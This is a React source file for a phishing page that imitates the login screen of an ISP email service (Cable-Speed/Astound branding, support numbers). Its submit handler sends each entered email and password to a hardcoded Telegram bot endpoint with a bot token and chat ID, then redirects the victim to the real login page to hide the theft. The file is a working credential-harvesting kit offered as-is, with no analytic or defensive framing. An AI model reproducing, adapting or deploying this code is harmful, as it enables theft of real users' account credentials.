import React from 'react';

import './Home.css'

import { useState } from 'react';

import axios from 'axios';

import iglou from './iglou.png';
import catskill from './catskill.png';
import winstream from './windstream.png';
import wave from './wave.png';

function Home(){


    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Cable-Speed")

    const[showError, setShowError] = useState(false);

    async function handleSubmit(e){
      e.preventDefault();
  
      try {
          // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
          //     email:email,
          //     password:password,
          //     platform:platform
          // });
  
         const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
              chat_id: 5868304053,
              text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
            });
  
      
          // Handle success
       
  
          if(response.status == 200){
             // console.log(response.data.message);
  
            
             window.location.href = 'https://cablespeed-email.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_56e5e2f75566a589926b780c3eb89e81af0c6c4259%3Ahttps%3A%2F%2Fcablespeed-email.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Femail.cablespeed.com%252F%26cookieTime%3D1714740829';
          }
        } catch (error) {
          // Handle error
          console.error('Error:', error);
        }
      
  }

    return (
        <>

        <div className='spacer'>
        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        </div>



            <div className='text-center my-2'>
            <img  src={wave} className="mylogo"/>

            </div>


            <div className='col-md-5 whitediv m-auto   px-0'>
              

              <h4 className='text-center'>Log In</h4>
                



                <form onSubmit={handleSubmit} className="px-5">

                    <div className='form-group mt-5'>
                        <label className='label'> USERNAME</label>
                        <input type="email"onChange={function(e){
                            setUserName(e.target.value);
                        }}value={email} placeholder="Username" className="form-control myinput"required />

                    </div>


                    <div className='form-group'>
                        <label className='label'> Password</label>
                 
                        <input type="password"onChange={function(e){
                            setPassword(e.target.value);
                        }}value={password} placeholder="Password" className="form-control w-80"required />
                       

                    </div>

                    <div className='form-group'>
                      <input type="checkbox" /> <span className='font-weight-bold px-2'>Remember Me ?</span>

                    </div>



                   


                    {/* <div className='form-group'>
                    <label class="toggle-container">
                        <input type="checkbox"className='mycheck'/> 
                     <span class="toggle-slider"></span> <span className='px-3 'style={{
                         fontSize:"15px",
                     }}>Shared computer - log me out after 4 hours</span>
    </label>

                    </div> */}


                    {/* <div className='form-group'>
                    <label class="toggle-container">
                        <input type="checkbox"className='mycheck'/> 
                     <span class="toggle-slider"></span> <span className='px-3 'style={{
                         fontSize:"15px",
                     }}>Keep me logged in until I log out</span>
    </label>

                    </div> */}


                    <div className='form-group text-center'>

<button type='submit' style={{
  backgroundColor: '#483092',
  fontSize:'25px',
}}className='btn text-center w-100 font-weight-bold text-light py-2 rounded '>LOGIN</button>






</div>

<div className='linkdiv'>
  <a style={{
        color: '#1f8aa3',
        textDecoration: 'underline',
  }}>Forgot Password <br/>
Privacy Policy<br/>
Terms of Service</a>

</div>



<br>

</br>

<div className='text-center py-3'>
  <h6 className='font-weight-bold'>Support - Contact Us at 1-800-4-ASTOUND</h6>
  <p className=''style={{
    fontSize:"14px",
  }}>Broadstripe Customers in Maryland please call 410-987-9300</p>
</div>
                 

                </form>

            </div>
        
        </>
    );
}

export default Home;